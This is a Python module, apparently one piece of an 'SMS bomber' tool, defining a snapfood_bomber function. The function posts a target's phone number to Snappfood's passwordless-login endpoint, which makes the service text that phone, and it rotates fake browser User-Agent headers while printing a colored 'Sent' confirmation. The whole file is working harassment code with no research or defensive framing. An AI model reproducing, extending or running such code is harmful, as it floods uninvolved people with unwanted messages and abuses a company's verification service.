import requests
from time import sleep
from colorama import Fore as color  
import json
import random
from datetime import datetime
def snapfood_bomber(number):
    bold ='\033[1m'

    heads = [
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
        'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
]
    
    rhead = random.choice(heads)
    namava_request = {"cellphone":"0"+number}
    namava = 'https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=03451ca3-3417-4c06-840a-f748c4e98930&locale=fa'

    
    try:
        req = requests.post(namava, json=namava_request, headers=rhead)
        print(req.status_code)
        sleep(0.5)
        try:
            print(color.GREEN+"[*] snappfood Sent...!",end= '')
            time = datetime.now()
            print(color.LIGHTGREEN_EX+ bold +'\t'+str(time.hour)+":"+str(time.minute)+":"+str(time.second))
        except:
            print(color.RED+"[-] Something Went Wrong...") 
            raise        
    except:
        print("something went wrong...")
        raise


#url =('https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=03451ca3-3417-4c06-840a-f748c4e98930&locale=fa')
#data = {"cellphone":"+98"+phonenum}